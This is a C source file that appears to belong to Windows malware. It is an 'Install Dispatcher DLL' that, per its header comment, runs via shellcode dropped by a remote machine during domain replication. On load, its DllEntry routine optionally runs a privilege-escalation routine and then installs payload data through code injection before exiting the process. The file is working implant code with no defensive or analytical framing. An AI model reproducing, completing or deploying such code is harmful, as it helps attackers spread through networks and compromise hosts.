/*
	idd.c
	Install Dispatcher DLL
	Executed via shellcode inside of on-disk file, placed by remote machine when domain replication process is in progress
	Selects install method to place all the extra data specified by SHELLCODE_CONTEXT structure

*/


// perform essential compiler settings
// remove stdlib 
#pragma comment(linker, "/NODEFAULTLIB:libcmt.lib") 
#pragma comment(linker, "/NODEFAULTLIB:MSVCRT.lib")
#pragma comment(linker, "/NODEFAULTLIB:MSVCRTD.lib")
#pragma comment(linker, "/NODEFAULTLIB:libcmtd.lib")


#include <windows.h>



#include "..\inc\mem.h"
#include "..\inc\dbg.h"
//#include "..\inc\CryptoStrings.h"


#include "..\shared\config.h"

#ifdef DO_PRIVILEGE_ESCALATION
#include "PrivEsc.h"
#endif

#include "Install_Injection.h"


#if defined(_M_X64)
	// x64 system libs
	#pragma comment (lib, "..\\lib\\amd64\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\amd64\\ntdll.lib")
#elif defined(_M_IX86)
	// x32 system libs
	#pragma comment (lib, "..\\lib\\i386\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\i386\\ntdll.lib")
#else
	#error Unknown target CPU, no system libs can be found
#endif



#include "idd.h"



// entrypoint function for service exe 
BOOL WINAPI DllEntry(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	BOOL bRes = TRUE;

	if (fdwReason == DLL_PROCESS_ATTACH) {

		DbgPrint("DLL_PROCESS_ATTACH: entered");

		do {	// not a loop



#ifdef DO_PRIVILEGE_ESCALATION
			privescDo();
#endif

			// do init and return right back
			if (instInjection((SHELLCODE_CONTEXT *)lpvReserved)) { break; }

			// other methods...
			// ...

			// if got here -> installation failed
			DbgPrint("installation failed");

		} while (FALSE);	// not a loop

		DbgPrint("DLL_PROCESS_ATTACH: done");

		ExitProcess(0);

	}	// DLL_PROCESS_ATTACH

	return bRes;
}






